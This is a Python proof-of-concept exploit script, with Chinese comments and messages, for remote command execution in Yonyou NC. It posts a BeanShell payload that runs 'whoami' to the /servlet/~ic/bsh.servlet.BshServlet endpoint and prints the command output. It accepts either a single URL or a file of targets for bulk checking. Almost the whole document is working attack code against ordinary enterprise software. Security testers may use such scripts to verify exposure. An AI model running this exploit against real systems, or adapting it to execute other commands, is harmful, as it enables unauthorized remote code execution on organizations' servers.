#用友nc命令执行
from bs4 import BeautifulSoup
import sys
import requests

def rce_url(url):
    sess = requests.session()
    try:
        req = sess.post(url,data,headers=head,timeout=3).text
        html = BeautifulSoup(req, 'html.parser')
        try:
            payload = str(html.pre.string)
            pass
        except AttributeError:
            print("[-]"+"验证失败！")
            exit()
        try:
            if payload != None:
                print("[+]%s%s" %(url,payload))
            else:
                print("[-]"+"验证失败！")
        except:
            pass
        sess.close()
    except:
        print("请求超时!")

def rce_urls(url):
    try:
        reqs = requests.post(url, data, headers=head,timeout=3).text
        html = BeautifulSoup(reqs, 'html.parser')
        payload = str(html.pre.string)
        if payload != None:
            print("[+]%s%s" % (url, payload))
        else:
            print("[-]" + "验证失败！")
    except:
        print("请求超时！")

if __name__ == '__main__':
    print("#用友NC命令执行")
    print("------------------------------------------------------")
    print("使用说明： python poc.py 单个url/url文件")
    print("------------------------------------------------------")
    head = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }
    data = 'bsh.script=exec%28%22whoami%22%29%3B%0D%0A%0D%0A'
    payload = '/servlet/~ic/bsh.servlet.BshServlet'
    try:
        url = sys.argv[1]
        if "http" in url:
            url = url + payload
            rce_url(url)
        else:
            url = open(url,'r+')
            for i in url:
                url = str(i.rstrip('\n')) + payload
                rce_urls(url)
    except IndexError:
        print("输入有误！")
    except FileNotFoundError:
        print("找不到该url文件！")